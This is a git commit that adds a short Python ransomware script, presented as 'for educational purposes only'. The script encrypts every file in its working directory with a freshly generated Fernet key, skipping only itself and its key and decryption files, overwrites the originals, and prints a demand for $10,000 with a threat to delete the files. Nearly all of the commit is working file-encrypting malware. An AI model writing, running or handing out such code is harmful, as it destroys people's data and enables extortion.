bcbfc25dc82af638e33892caef53727f37913509
warlord765 <168755545+warlord765@users.noreply.github.com>
2024-10-07 21:14:19 +0300

    Add ransomware script for educational purposes only.
    For educational purposes only. I am not responsible for any misuse of the code or any resulting consequences.

---
+++ randsowmware.py
@@ -0,0 +1,35 @@
+#!/usr/bin/env python3
+
+import os
+from cryptography.fernet import Fernet
+
+
+#lets find some files
+
+
+files = []
+
+for file in os.listdir():
+	if file == "malware.py" or file == "thekey.key" or file == "decrypt.py":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+
+
+print(files)
+
+
+key = Fernet.generate_key()
+
+with open("thekey.key", "wb") as thekey:
+	thekey.write(key)
+
+for file in files:
+	with open(file, "rb") as thefile:
+		contents = thefile.read()
+	contents_encrypted = Fernet(key).encrypt(contents)
+	with open (file, "wb") as thefile:
+		thefile.write(contents_encrypted)
+
+
+print("all your files are worth nothing now but IF you wire me 10,000 dollars i will restore them AND IF YOU DONT I WILL DELETE THEM")
